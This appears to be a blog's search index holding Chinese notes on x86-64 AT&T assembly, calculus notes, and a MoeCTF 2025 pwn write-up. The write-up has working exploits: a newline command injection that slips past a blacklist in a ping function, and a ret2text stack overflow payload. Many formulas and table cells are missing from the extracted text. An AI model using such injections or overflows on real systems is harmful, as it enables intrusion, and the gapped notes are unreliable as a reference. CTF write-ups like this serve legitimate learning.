<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Assembly</title>
    <url>/2025/11/28/Assembly/</url>
    <content><![CDATA[汇编语言的AT&amp;T和Intel格式有下面不同：

Intel代码省略指示大小的后缀
Intel代码省略寄存器前的%
Intel代码用不同方式描述内存中的位置
在带有多个操作数的指令下，列出操作数的顺序相反

下面我们主要讲的是ATT(AT&amp;T)语法
通用目的寄存器



63~0
31~0
15~0
7~0




rax
eax
ax
al


rbx
ebx
bx
bl


rcx
ecx
cx
cl


rdx
edx
dx
cl


rsi
esi
si
sil


rdi
edi
di
dil


rbp
ebp
bp
bpl


rsp
esp
sp
spl


r8
r8d
r8w
r8b


r9
r9d
r9w
r9b


r10
r10d
r10w
r10b


r11
r11d
r11w
r11b


r12
r12d
r12w
r12b


r13
r13d
r13w
r13b


r14
r14d
r14w
r14b


r15
r15d
r15w
r15b



操作数指示符（内存寻址表达式）



类型
格式
操作数值
名称




立即数


立即数寻址


寄存器


寄存器寻址


存储器


绝对寻址


存储器


间接寻址


存储器


偏移量寻址


存储器


变址寻址


存储器


变址寻址


存储器


比例变址寻址


存储器


比例变址寻址


存储器


比例变址寻址


存储器


比例变址寻址



后缀



C声明
Intel数据类型
汇编代码后缀
字节大小




char
字节
b
1


short
字
w
2


int
双字
l
4


long
四字
q
8


char*
四字
q
8


float
单精度
s
4


double
双精度
l
8



为了后面述说方便，把此类后缀统称为
mov系
：可以操作的特定数据大小
movb movw movl movq movabsq
还有一个特殊的指令 ，目的只能是寄存器，表示传送绝对的四字
：从较小的源值（bytes1）传送到较大的目的（bytes2）时，将剩余的字节填充为0，称为零扩展
movzbw movzbl movzbq movzwl movzwq
事实上没有，使用来替代，因为任何为寄存器生成32位值的指令都会把该寄存器的高位部分置为0
：从较小的源值（bytes1）传送到较大的目的（bytes2）时，将剩余的字节填充为源值的符号位（最高位），称为符号扩展
movsbw movsbl movsbq movswl movswq cltq
其中是一条特殊的指令，没有操作数，仅用于将的符号扩展到
关于操作数的约定
，其中为源操作数，为目的操作数
源操作数指定的类型是立即数、寄存器或内存，目的操作数指定一个位置，是一个寄存器或是一个内存地址
，其中为源操作数，为目的操作数
源操作数指定的类型是寄存器或内存，目的操作数指定一个位置，是一个寄存器
，其中为源操作数，为目的操作数
源操作数指定的类型是寄存器或内存，目的操作数指定一个位置，是一个寄存器
在x86-64中，两个操作数不能都指向内存地址，实现一个值从内存地址复制到另一个内存地址需要先加载到寄存器中，再从寄存器中加载到内存地址中

movq 和 movabsq 的区别
movq指令只能以表示为32位补码数字的立即数作为源操作数，然后把这个值符号扩展得到64位的值
movabsq指令能够以任意64位立即数值作为源操作数，并且只能以寄存器作为目的
关于这个的详细讨论篇幅过大，为了不影响文章的观感，我将这部分的详细内容放在文末

pop、push系









指令
效果
等价
描述







将四字压入栈





将四字弹出栈



算术和逻辑操作



指令
效果
描述






加载有效地址




加1




减1




取负




取反




加




减




乘




异或




或




与




左移




左移




算数右移




逻辑右移



lea系
是mov系的变形
源操作数必须是合法内存寻址表达式，目的操作数必须是寄存器
常用于计算目的地址和简单算数计算
移位运算
移位量可以是一个立即数，或者放在单字节寄存器%cl中
移位操作对w位长的数据值进行操作，移位量由%cl寄存器的低m位决定的，这里
异或运算
常常用表示赋值为0，初始化等，并且会清除标志位
特殊的算术操作








指令
效果
描述






有符号全乘法




无符号全乘法



符号拓展
转换为八字




有符号除法




无符号除法



对于有符号除法通常使用cqto实现符号拓展，无符号除法通常使用异或将RDX置0
控制条件码



条件码
描述




CF
进位标志，最近的操作使最高位产生了进位则置1


ZF
零标志，最近的操作得到0则置1


SF
符号标志，最近的操作得到负数则置1


OF
溢出标志，最近操作导致一个补码溢出则置1



算术和逻辑运算中除了leaq不改变任何条件码，其他都会设置条件码

XOR设置CF、ZF为0
移位操作设置CF为最后一个移出的位，OF设置为0
INC、DEC会设置ZF、OF，但不会设置CF

CMP、TEST系



指令
基于
描述






比较




比较字节




比较字




比较双字




比较四字




测试




测试字节




测试字




测试双字




测试四字



cmp、test系只会设置条件码而不更新目的寄存器
SET系
set系指令是一种根据条件码组合将字节设置为0或1的一套指令
其后缀不再是表示操作数大小而是操作条件，目的操作数是低位单字节寄存器元素之一或是一个字节的内存位置



指令
同义名
效果
设置条件







相等/零





不等/非零





负数





非负数





大于





大于等于





小于





小于等于





超过（无符号）





超过或等于（无符号）





低于（无符号）


 | 

低于或等于（无符号）




JMP系



指令
同义名
跳转条件
描述







直接跳转





间接跳转





相等/零





不相等/非零





负数





非负数





大于（有符号）





大于或等于（有符号）





小于（有符号）





小于或等于（有符号）





大于（无符号）





大于或等于（无符号）





小于（无符号）





小于或等于（无符号）



mov的正确使用注意点
立即数（immediate）是直接写在指令里的常量（比如、-456），不是寄存器或内存里的值
立即数的 “宽度限制”
CPU 指令的编码空间有限，不能无限制支持任意宽度的立即数：

最常用的是 32 位立即数（imm32）：占 4 字节，编码紧凑（指令短，执行快），覆盖绝大多数场景（用户态地址、常见常量都在 32 位范围内）
特殊场景支持 64 位立即数（imm64）：占 8 字节，编码长（指令长，执行稍慢），仅用于超过 32 位的常量（如内核地址、大数值）

扩展规则的使用
x86-64 为了兼容 32 位程序，规定了两种 “32 位值扩展到 64 位” 的规则

零扩展（Zero-Extend）：高 32 位全部填充 0
触发条件：对32 位寄存器执行写操作（如），硬件自动将对应的 64 位寄存器（%rax）高 32 位清 0
符号扩展（Sign-Extend）：高 32 位填充为32 位立即数的最高位（符号位）
触发条件：使用movq的 7 字节编码（movq  r64, sign − ext − imm32），32 位立即数的最高位是1（负数）则高 32 位填1，是0（正数）则填0

指令编码格式的 “绑定规则”











指令
绑定的编码格式
立即数宽度
扩展规则
编码长度
目的地限制





（寄存器）（内存）
32 位
零扩展（寄存器）
5 字节（寄存器）≥6 字节（内存）
32 位寄存器、32 位内存



① （寄存器 / 内存）② （仅寄存器）
①32 位②64 位
①符号扩展②无扩展
①7 字节②10 字节
①64 位寄存器 / 64 位内存②仅 64 位寄存器



（寄存器）
64 位
无扩展
10 字节（寄存器）
64 位寄存器



关键：指令后缀（l/q）和助记符（movabsq）直接锁定编码格式，汇编器不会自动转换（比如写 movq 就不会用 movl 的 5 字节编码）
movabsq和movq的第二种用法其实是等价的，机器会通过判断立即数来选择编码格式，来达到减小编码长度的目的
填充64位寄存器有三种方式：

移动到32位低位：B8 +rd id，5字节 示例：mov eax，241 / mov[l] $241，%eax 将值移动到32位寄存器的低32位会将高32位清零
使用64位立即数进行移动：48 B8 +rd io，10字节 示例：mov rax，0xf1f1f1f1f1f1f1f1 / mov[abs][q] $0xf1f1f1f1f1f1f1f1，%rax 移动一个完整的64位立即数
使用符号扩展的32位立即数进行移动：48 C7 /0 id，7字节 示例：mov rax，0xffffffffffffffff / mov[q] $0xffffffffffffffff，%rax 将带符号的32位立即数移动到完整的64位寄存器中

对于每个立即值，我们有:

在[0, 0x7fff_ffff]中的值可以使用（1），（2）和（3）进行编码
在[0x8000_0000, 0xffff_ffff]中的值可以使用（1）和（2）进行编码
在[0x1_0000_0000, 0xffff_ffff_7fff_ffff]中的值可以使用（2）进行编码
在[0xffff_ffff_8000_0000, 0xffff_ffff_ffff_ffff]中的值可以使用（2）和（3）进行编码


为什么没有 “mov m64, imm64”（不能直接把 64 位立即数写内存）
硬件设计的权衡：64 位立即数占 8 字节，加上操作码和地址字段，指令会非常长（10 字节以上），而 “64 位立即数写内存” 的场景极少，大部分可用 “寄存器中转” 替代，CPU 厂商没有为这种小众场景设计指令 —— 所以若要写 64 位立即数到内存，必须先加载到寄存器（movabsq），再间接写内存（movq）

AT&amp;T 语法 MOV 指令集表格










Opcode
AT&amp;T 指令
Op/En（操作数类型）
Compat/Leg Mode（兼容 / 实模式）
Description




88 /r

MR源 = 寄存器目的 = 寄存器 / 内存
Valid
8 位寄存器 → 8 位寄存器 / 内存


REX + 88 /r

MR
N.E.
8 位扩展寄存器 → 8 位扩展寄存器 / 内存


89 /r

MR
Valid
16 位寄存器 → 16 位寄存器 / 内存


89 /r

MR
Valid
32 位寄存器 → 32 位寄存器 / 内存


REX.W + 89 /r

MR
N.E.
64 位寄存器 → 64 位寄存器 / 内存


8A /r

RM源 = 寄存器 / 内存目的 = 寄存器
Valid
8 位寄存器 / 内存 → 8 位寄存器


REX + 8A /r

RM
N.E.
8 位扩展寄存器 / 内存 → 8 位扩展寄存器


8B /r

RM
Valid
16 位寄存器 / 内存 → 16 位寄存器


8B /r

RM
Valid
32 位寄存器 / 内存 → 32 位寄存器


REX.W + 8B /r

RM
N.E.
64 位寄存器 / 内存 → 64 位寄存器


8C /r

MR
Valid
段寄存器 → 16 位寄存器 / 内存


8C /r
$movl%sreg, %r32\  &lt; br&gt; movw%sreg, %r16/%r/m16$
MR
Valid
16 位段寄存器零扩展 → 32 位寄存器/ 16 位寄存器 / 内存


REX.W + 8C /r
$movq%sreg, %r64\  &lt; br&gt; movw%sreg, %r/m16$
MR
Valid
16 位段寄存器零扩展 → 64 位寄存器/ 16 位内存


8E /r

RM
Valid
16 位寄存器 / 内存 → 段寄存器


REX.W + 8E /r

RM
Valid
64 位寄存器 / 内存的低 16 位 → 段寄存器


A0

FD源 = 绝对地址内存目的 = 固定寄存器
Valid
绝对地址（段：偏移）的 8 位内存 → % al


REX.W + A0

FD
N.E.
64 位绝对地址的 8 位内存 → % al


A1

FD
Valid
绝对地址（段：偏移）的 16 位内存 → % ax


A1

FD
Valid
绝对地址（段：偏移）的 32 位内存 → % eax


REX.W + A1

FD
N.E.
64 位绝对地址的 64 位内存 → % rax


A2

TD源 = 固定寄存器目的 = 绝对地址内存
Valid
% al → 绝对地址（段：偏移）的 8 位内存


REX.W + A2

TD
N.E.
% al → 64 位绝对地址的 8 位内存


A3

TD
Valid
% ax → 绝对地址（段：偏移）的 16 位内存


A3

TD
Valid
% eax → 绝对地址（段：偏移）的 32 位内存


REX.W + A3

TD
N.E.
% rax → 64 位绝对地址的 64 位内存


B0+rb ib

OI源 = 立即数目的 = 寄存器
Valid
8 位立即数 → 8 位寄存器


REX + B0+rb ib

OI
N.E.
8 位立即数 → 8 位扩展寄存器


B8+rw iw

OI
Valid
16 位立即数 → 16 位寄存器


B8+rd id

OI
Valid
32 位立即数 → 32 位寄存器，64 位模式下自动零扩展到 64 位


REX.W + B8+rd io

OI
N.E.
64 位立即数 → 64 位寄存器


C6 /0 ib

MI源 = 立即数目的 = 寄存器 / 内存
Valid
8 位立即数 → 8 位寄存器 / 内存


REX + C6 /0 ib

MI
N.E.
8 位立即数 → 8 位扩展寄存器 / 内存


C7 /0 iw

MI
Valid
16 位立即数 → 16 位寄存器 / 内存


C7 /0 id

MI
Valid
32 位立即数 → 32 位寄存器 / 内存


REX.W + C7 /0 id

MI
N.E.
32 位立即数符号扩展到 64 位 → 64 位寄存器 / 内存



例子(此部分由AI生成)
场景 1：立即数在 32 位范围内
零拓展
movl $0x12345678, %eax   ; 5字节编码：%eax = 0x12345678，硬件自动清%rax高32位→ %rax = 0x0000000012345678（正确）movl $0xFFFFFFFF, %eax   ; 5字节编码：%eax = 0xFFFFFFFF，高32位清0→ %rax = 0x00000000FFFFFFFF（正确，这是之前想要的结果）
符号拓展
movq $0xFFFFFFFE, %rax   ; 7字节编码：32位立即数0xFFFFFFFE的最高位是1，符号扩展后高32位填1→ %rax = 0xFFFFFFFFFFFFFFFFFE（64位 `-2`，符合需求）
movq $0x12345678, (%rdi)  ; 7字节编码：将32位立即数符号扩展为64位，写入%rdi指向的8字节内存→ 内存内容：0x0000000012345678（正数扩展0）movq $0xFFFFFFFE, (%rdi)  ; 7字节编码：符号扩展后写入，内存内容：0xFFFFFFFFFFFFFFFFFE
场景 2：立即数超过 32 位
movabsq $0x123456789ABCDEF0, %rax  ; 10字节编码：直接加载64位立即数，无扩展→ %rax = 0x123456789ABCDEF0（正确）movabsq $0xFFFFFFFFFFFFFFFF, %rax  ; 10字节编码：加载64位全1，即64位 `-1`→ %rax = 0xFFFFFFFFFFFFFFFF（正确）
先加载到寄存器（movabsq），再用 movq 间接写内存。例子：
目标：将64位值0x123456789ABCDEF0写入%rdi指向的8字节内存movabsq $0x123456789ABCDEF0, %rax  ; 步骤1：加载64位立即数到%rax（10字节）movq %rax, (%rdi)                   ; 步骤2：通过%rax间接写入内存（7字节）
场景 3：操作 64 位绝对地址内存（比如内核地址 0xFFFF800000001234）
用 movabsq %r64, mem64直接写 64 位绝对地址，无需寄存器间接寻址
movabsq $0x123456789ABCDEF0, %rax  ; 加载数据到%raxmovabsq %rax, 0xFFFF800000001234   ; 直接将%rax的值写入64位绝对地址（10字节编码）
为什么不用 movq？movq %rax, 0xFFFF800000001234 不支持 64 位绝对地址，只能用 “基址 + 位移” 的间接寻址（如 movq %rax, 0x1234(%rbx)）
场景 4：加载符号地址（比如变量 / 函数名 symbol）
这是实际编程中最常用的场景，优先用 lea（RIP 相对寻址，高效且位置无关），特殊情况用 movabsq
lea msg(%rip), %rdi  ; 加载字符串msg的地址到%rdi，支持PIE（现代Linux默认），编码紧凑
特殊场景必须用绝对地址（如内核编程）
movabsq $kernel_var, %rdi  ; 加载内核变量kernel_var的绝对地址到%rdi
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Calculus</title>
    <url>/2025/11/21/Calculus/</url>
    <content><![CDATA[函数性质
单调性
设函数在上连续，在内可导
若在内，那么函数在上单调递增（减少）
注意：若，则在的足够小领域内，不一定为单调增加函数，比如
极值
第一充分条件（非必要）
设函数在内连续，在内可导，且
若时，时，则是极大值点
若时，时，则是极小值点
若在点的两侧保持同号，则单调
第二充分条件（非必要）
设函数在处具有二阶导数且，则
当时，函数在处取得极小值
当时，函数在处取得极大值
定理1
若函数在处存在阶导数，且，但，则
当为奇数时不是函数的极值点
当为偶数时是函数的极值点，若则是极小值点，若则是极大值点
凸性
设函数在区间上有定义，若对于上任意两点和任意实数总有  则称为区间上的下凸函数，称曲线在区间上是下凸的（凸函数）
若对于上任意两点和任意实数总有  则称为区间上的上凸函数，称曲线在区间上是上凸的（凹函数）
定理1
设函数在区间上可导，则函数在区间上上凸（上凸）的充分必要条件是在区间上单调递增（递减）
定理2
函数在上连续，在内具有二阶导数，那么
若在内，则在上的图形是下凸的（上凸的）

拐点是指曲线在点的左右两侧凸性相反的点

渐近线
先考虑水平渐近线和铅直渐近线
定理1
若以下极限存在  则是的斜渐近线
间断点
若是函数的一个间断点，可能有

在点无定义
在点有定义但极限不存在
在点有定义且极限存在，但

第一类间断点
均存在的间断点

可去间断点：
跳跃间断点：

第二类间断点
至少有一个不存在的间断点

无穷间断点：
振荡间断点：对于，即是振荡间断点

连续函数的局部性质

局部有界性
局部保号性
四则运算法则
反函数连续性

闭区间上连续函数的性质

最大值最小值定理
有界性定理
零点定理
介质定理

概念剖析
连续
某点连续
若在连续
则可推出在邻域内有定义，
不可推出在邻域内连续，在可导，反例

某邻域连续
若在某邻域内连续
则可推出在邻域内有定义，在邻域内处处连续
不可推出在可导，反例维尔斯特拉斯函数

某去心邻域连续
若在某去心邻域内连续
则可推出在去心邻域内有定义，在去心邻域内处处连续
不可推出在可导，在极限存在

可导
某点可导
若在可导
则可推出在处有定义，在处连续，
不可推出在邻域内连续，在邻域内可导，反例

某邻域可导
若在某邻域内可导
则可推出在邻域内有定义，在邻域内有定义，在邻域内处处连续，在邻域内极限存在
不可推出在邻域内有连续，在邻域内极限存在，反例

某去心邻域可导
若在某去心邻域内可导
则可推出在去心邻域内有定义，在去心邻域内连续，在去心邻域内极限存在，在去心邻域内有定义
不可推出在处有定义，在处连续，在处极限存在，在处有定义

二阶可导
某点二阶可导

某邻域二阶可导

某去心邻域二阶可导

导数

若有定义并且极限存在（并且在处连续），则在可导，其导数就是该极限  而极限存在的充要条件  所以可导的充要条件  其中 

又其中在极限存在与在是否有定义和有定义时取值大小无关，即在点的状况不影响时的变化趋势
故极限定义时不考虑，左极限只要求在有定义，右极限只要求在有定义
极限只要求在有定义  至于可导要求在有定义，是因为连续是可导的必要非充分条件
连续，图像在每一点都有切线，但是不一定在每一点都可导，比如
极限求解
等价无穷小

泰勒公式

洛必达法则
仅适用于未定式，并且要求上下函数极限存在 
定积分
适用于连加或连乘的形式，一般具有如下特征

分子是0次或是1次的
分母都是2次的
分母次数比分子多一


变上限积分
使用洛必达法则 
求导

反函数求导

可导性讨论
对于复合函数来说，若内外函数有一个不可导或都不可导，则复合函数不一定可导
比如说都不可导
隐函数求导

或者使用微分
对数求导法

参数方程求导
严格单调
高阶导数

莱布尼茨公式：适用于求两个函数相乘，其中一个函数在高阶导数时为0 
或是使用泰勒公式化开
反函数高阶导数  参数方程高阶导数  隐函数高阶导数 
微分
函数在点的某邻域内有定义，，如果函数增量可表示为，其中只与有关，与无关，而是比高阶的无穷小，则称在点可微，称为函数在点相应于自变量增量的微分，记作，即
微分是函数增量的线性主部
定理1：对于一元函数来说可微和可导是等价的，对于多元函数来说，可微是可导的充分非必要条件
微分中值定理
费马定理
设函数在点取得极值，若存在，则必有，该点也称为驻点
罗尔中值定理
设函数在闭区间上连续，在开区间上可导，并且满足，则存在使得
拉格朗日中值定理
设函数在闭区间上连续，在开区间上可导，则存在使得
另一种表达形式，有限增量公式：
柯西中值定理
设函数在闭区间上连续，在开区间上可导，且在内的每一点处均不为0，则存在使得
泰勒中值定理
函数在含有的某个开区间内具有阶导数，则对任一x ∈ (a, b)，有  其中
所谓的佩亚诺型余项就是将换为
麦克劳林公式是指 
积分
基本积分表
































技巧






第一类换元积分法（拼凑）

第二类换元积分法（简化根式）

分部积分法（微分简化）

分部积分法的精髓在于合理利用一次微分将表达式简化，一个部分被还原为原函数，一个部分变为导函数
二次积分表


有理函数积分


对于其他分式化为有理分式后再积分  此外，对于形如 



可有理化函数的积分
使用万能公式将三角函数有理式变为有理函数，再进行积分  或是使用  或是使用辅助角公式 

或是分母有理化  对于带有根式的此类函数 
欧拉公式在简化三角函数乘积积分中的应用







欧拉代换
形如的不定积分
第一替代
第二替代
第三替代
奥斯特罗格拉茨基方法

其中若，则  其中的系数可用待定系数法确定
定积分
若是定义在闭区间上的有界函数，和式在时总趋于确定的常数，那么称在上可积（黎曼可积），其极限为在上的定积分，也称黎曼积分，  否则称在上不可积
满足下列条件的函数在上可积

在上连续
在上有界并且只有有限个间断点
在上单调有界

虽然在区间内有有限个间断点但是不满足有界：
虽然有界但是不单调：
线性性质 

比如  保号性  单调性 


区间可加性  不等式 

积分中值定理  注意条件是不变号，反例  注意条件是连续而不是黎曼可积，反例 
微积分基本定理
若在上可积，且在上的一个原函数为，则  该式称为牛顿莱布尼茨公式
若在上连续，且在上的一个原函数为，则  该式称为广义的牛顿莱布尼茨公式
定积分的可积与不定积分的可积不是一个概念
有原函数不一定黎曼可积  黎曼可积不一定有原函数  积分上限函数 

若在上可积，则在上连续
若在上连续，则在上可导，且，即是在上的一个原函数

分段函数：分段相加
换元积分法
若在上连续，函数在或上有连续导数，且或，则 
分部积分法

常用结论

使用圆的面积解释



设在上连续，有


若为奇函数，则  若为偶函数，则 

设在上连续，有






对于三角函数高次定积分




有 

巧用质心求定积分

对于曲线弧线  对于平面图形 
技巧


平面图形面积

X型区域
Y型区域
极坐标系


体积
绕x轴旋转体  绕y轴旋转体  已知截面面积  柱壳法 
弧长
直角坐标系  参数方程  极坐标系 
旋转体表面积

反常积分
积分限不是有限的或者被积函数不是有界函数的积分
对于  需要右边两个积分同时收敛时才收敛

注意：只有收敛的条件下才能认为有偶倍奇零


上面这个反常积分是发散的
对于在上连续，点是的瑕点，对于任意的，在上可积  同样的
对于在上连续，点是的瑕点  该反常积分当且仅当右侧两个反常积分均收敛时才收敛
p-积分

当时积分收敛其值为，当时积分发散  当时积分收敛其值为，当时积分发散
托里拆利小号
性质

若收敛，则
满足线性运算
若在任何有限区间上可积，且，与有相同的敛散性
若与均收敛，且，则
若收敛，也称绝对收敛，则收敛

对于无界函数的反常积分也有同样的性质

注意：以下说法是错误的
（1）若连续且收敛，则，反例
（2）若无界，则发散，反例

对应上面注意

若是上的单调函数且收敛，则，且
若在上一致连续且收敛，则

非负函数审敛法
若不满足，则可以先讨论的收敛性
比较判别法：
设有区间上的非负函数和，若使，又对于任何，和在区间上可积，则

若收敛，则收敛
若发散，则发散

推论1：设有区间上的非负函数和，且，则

当时，与收敛性相同
当时，收敛则收敛
当时，发散则发散

对于无界函数的判别法类似
另外的判别法这里不做介绍
额外性质补充
对于反常积分来说也有夹逼定理
即若，若、均收敛，则也收敛，且有 

若收敛，则收敛
若、收敛，则、收敛
若绝对收敛，且，则必定收敛
设为上的非负连续函数，若收敛，则收敛
设为上的连续可微函数，当时，递减趋于零，则收敛的充要条件为收敛




杂项
双曲线的定义
坐标在双曲线上，其中指该点与该点关于轴对称的点与原点连线和双曲线轨迹形成的图形面积
参考
高数 | 【概念剖析】 一点可导和邻域内可导能推出来什么？_函数在某点可导可以推出什么-CSDN博客
分式型函数积分的一些常用方法 - 知乎
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>Moectf2025 pwn</title>
    <url>/2025/10/12/Moectf2025-pwn/</url>
    <content><![CDATA[Moectf2025 新生赛
本人是大一新生，刚入门pwn，参加了Moectf2025的新生赛，想写一篇文章记录一下，如果有任何文章问题，望指正。
在这里特别感谢Maple师傅的指导。
文章里的题目顺序并不是按难度排的。
ez_u64
unsigned __int64 vuln()&#123;__int64 v1; // [rsp+0h] [rbp-10h] BYREFunsigned __int64 v2; // [rsp+8h] [rbp-8h]v2 = __readfsqword(0x28u);puts(&quot;Ya hello! Let&#x27;s play a game.&quot;);printf(&quot;Guess which number I&#x27;m thinking of.&quot;);printf(&quot;Here is the hint.&quot;);write(1, &amp;num, 8uLL);printf(&quot;\n&gt;&quot;);__isoc99_scanf(&quot;%zu&quot;, &amp;v1);if ( v1 != num )&#123; puts(&quot;Wrong answer!&quot;); puts(&quot;Try pwntools u64?&quot;); exit(1);&#125;puts(&quot;Win!&quot;);system(&quot;/bin/sh&quot;);return v2 - __readfsqword(0x28u);&#125;
p=start()p.recvuntil(&quot;Here is the hint.&quot;)leaked_data = p.recv(8)log.info(f&quot;leak data: &#123;leaked_data.hex()&#125;&quot;)num = u64(leaked_data)log.info(f&quot;data: &#123;num&#125;&quot;)p.recvuntil(&quot;&gt;&quot;)p.sendline(str(num))p.interactive()

[DEBUG] Received 0x5b bytes: 00000000 59 61 20 68 65 6c 6c 6f 21 20 4c 65 74 27 73 20 │Ya h│ello│! Le│t’s │
00000010 70 6c 61 79 20 61 20 67 61 6d 65 2e 0a 47 75 65 │play│ a g│ame.│·Gue│
00000020 73 73 20 77 68 69 63 68 20 6e 75 6d 62 65 72 20 │ss w│hich│ num│ber │
00000030 49 27 6d 20 74 68 69 6e 6b 69 6e 67 20 6f 66 2e │I’m │thin│king│ of.│
00000040 48 65 72 65 20 69 73 20 74 68 65 20 68 69 6e 74 │Here│ is │the │hint│
00000050 2e ea 1e 03 77 ac 92 b2 d2 0a 3e │.···│w···│··&gt;│
0000005b
[*] 泄露的数据: ea1e0377ac92b2d2
[*] 转换后的数值: 15182358563248086762

find_it
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int fd; // eax  char file[40]; // [rsp+0h] [rbp-30h] BYREF  unsigned __int64 v6; // [rsp+28h] [rbp-8h]  v6 = __readfsqword(0x28u);  init(argc, argv, envp);  fd = dup(1);  write(fd, &quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;, 0x2FuLL);  close(1);  __isoc99_scanf(&quot;%d&quot;, &amp;fd1);  write(fd1, &quot;You are right.What would you like to see?\n&quot;, 0x2AuLL);  __isoc99_scanf(&quot;%s%*c&quot;, file);  open(file, 0);  write(fd1, &quot;What is its fd?\n&quot;, 0x10uLL);  __isoc99_scanf(&quot;%d&quot;, &amp;fd2);  read(fd2, &amp;buf, 0x50uLL);  write(fd1, &amp;buf, 0x50uLL);  return 0;&#125;
这道考的是文件标志符，3，flag，1就行了
inject
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-2Ch] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-28h]  v5 = __readfsqword(0x28u);  setbuf(_bss_start, 0LL);  setbuf(stdin, 0LL);  puts(&quot;Welcome to server maintainance system.&quot;);  while ( 1 )  &#123;    _printf_chk(      1LL,      &quot;1. List processes\n2. Check disk usage\n3. Check network activity\n4. Test connectivity\n5. Exit\nYour choice: &quot;);    if ( (int)_isoc99_scanf(&quot;%u&quot;, &amp;v4) &lt; 0 )      break;    getc(stdin);    switch ( v4 )    &#123;      case 1:        execute(&quot;ps aux&quot;);        break;      case 2:        execute(&quot;df -h&quot;);        break;      case 3:        execute(&quot;netstat -ant&quot;);        break;      case 4:        ping_host();        break;      case 5:        exit(0);      default:        puts(&quot;Invalid choice!&quot;);        break;    &#125;  &#125;  exit(1);&#125;
main函数没有什么漏洞，查看ping_host()
unsigned __int64 ping_host()&#123;  _QWORD *buf_1; // rsi  size_t v1; // rax  char *command_1; // rdi  unsigned __int64 result; // rax  char v4; // [rsp+1h] [rbp-51h]  _QWORD buf[2]; // [rsp+2h] [rbp-50h] BYREF  char command[40]; // [rsp+12h] [rbp-40h] BYREF  unsigned __int64 v7; // [rsp+3Ah] [rbp-18h]  v7 = __readfsqword(0x28u);  buf[0] = 0LL;  buf[1] = 0LL;  _printf_chk(1LL, &quot;Enter host to ping: &quot;);  buf_1 = buf;  if ( read(0, buf, 0xFuLL) &lt;= 0 )    exit(1);  v1 = strlen((const char *)buf);  if ( *(&amp;v4 + v1) == 10 )    *(&amp;v4 + v1) = 0;  if ( (unsigned int)check(buf) )  &#123;    buf_1 = &amp;qword_20;    _snprintf_chk(command, 32LL, 1LL, 32LL, &quot;ping %s -c 4&quot;, (const char *)buf);    command_1 = command;    execute(command);  &#125;  else  &#123;    command_1 = &quot;Invalid hostname or IP!&quot;;    puts(&quot;Invalid hostname or IP!&quot;);  &#125;  result = v7 - __readfsqword(0x28u);  if ( result )    _stack_chk_fail(command_1, buf_1);  return result;&#125;
_BOOL8 __fastcall check(const char *s)&#123;  return strpbrk(s, &quot;;&amp;|&gt;&lt;$()&#123;&#125;[]&#x27;\&quot;`\\!~*&quot;) == 0LL;&#125;
可以执行我们输入的内容和原有内容的组合，不能带有check函数中的符号
，是可以通过check函数的
cat flag命令没有参数，所以要将后面的省略了
p = start()p.recvuntil(b&quot;Your choice: &quot;)p.sendline(b&#x27;4&#x27;)p.recvuntil(b&#x27;Enter host to ping: &#x27;)payload=b&#x27;1\ncat flag\n#&#x27;p.sendline(payload)p.interactive()
执行的是
ping 1cat flag# -c 4
Ret2text
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF  init(argc, argv, envp);  puts(&quot;Stack overflow is a powerful art!&quot;);  puts(&quot;In this MoeCTF,I will show you the charm of PWN!&quot;);  puts(&quot;You need to understand the structure of the stack first.&quot;);  puts(&quot;Then how many bytes do you need to overflow the stack?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  overflow(v4);  return 0;&#125;
int __fastcall overflow(int n7)&#123;  _BYTE buf[8]; // [rsp+18h] [rbp-8h] BYREF  if ( n7 &lt;= 7 )    return puts(&quot;Come on, you can&#x27;t even fill up this array?&quot;);  read(0, buf, n7);  return puts(&quot;OK,I receive your byte.and then?&quot;);&#125;
public treasure.text:00000000004011B6 treasure        proc near.text:00000000004011B6 ; __unwind &#123;.text:00000000004011B6                 endbr64.text:00000000004011BA                 push    rbp.text:00000000004011BB                 mov     rbp, rsp.text:00000000004011BE                 lea     rax, s          ; &quot;Congratulations! You got the secret!&quot;.text:00000000004011C5                 mov     rdi, rax        ; s.text:00000000004011C8                 call    _puts.text:00000000004011CD                 lea     rax, command    ; &quot;/bin/sh&quot;.text:00000000004011D4                 mov     rdi, rax        ; command.text:00000000004011D7                 call    _system.text:00000000004011DC                 nop.text:00000000004011DD                 pop     rbp.text:00000000004011DE                 retn.text:00000000004011DE ; &#125; // starts at 4011B6.text:00000000004011DE treasure        endp
简单的栈溢出，适用于没有PIE保护、无canary、可以溢出足够长并且具有后门函数的情况
8个A覆盖buf[8]，8字节覆盖rbp，8字节覆盖返回地址
io = start()io.recvuntil(b&quot;Then how many bytes do you need to overflow the stack?&quot;)io.sendline(str(32))payload=b&#x27;A&#x27;*8+p64(0x401310)+p64(0x4011CD)io.send(payload)io.interactive()
通常情况下，最好选择返回地址为关键部分，否则可能出现某些错误，比如说这道题可能出现栈没对齐的情况
Ret2shellcode
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+0h] [rbp-20h] BYREF  int prot; // [rsp+4h] [rbp-1Ch]  int v6; // [rsp+8h] [rbp-18h]  int n10; // [rsp+Ch] [rbp-14h]  void *s; // [rsp+10h] [rbp-10h]  unsigned __int64 v9; // [rsp+18h] [rbp-8h]  v9 = __readfsqword(0x28u);  init(argc, argv, envp);  s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);  if ( s == (void *)-1LL )  &#123;    perror(&quot;mmap&quot;);    return 1;  &#125;  memset(s, 0, 0x1000uLL);  v6 = 0;  prot = 0;  puts(&quot;In a ret2text exploit, we can use code in the .text segment.&quot;);  puts(&quot;But now, there is no &#x27;system&#x27; function available there.&quot;);  puts(&quot;How can you get the flag now? Perhaps you should use shellcode.&quot;);  puts(&quot;But what is shellcode? What can you do with it? And how can you use it?&quot;);  puts(&quot;I will give you some choices. Choose wisely!&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n4);  do    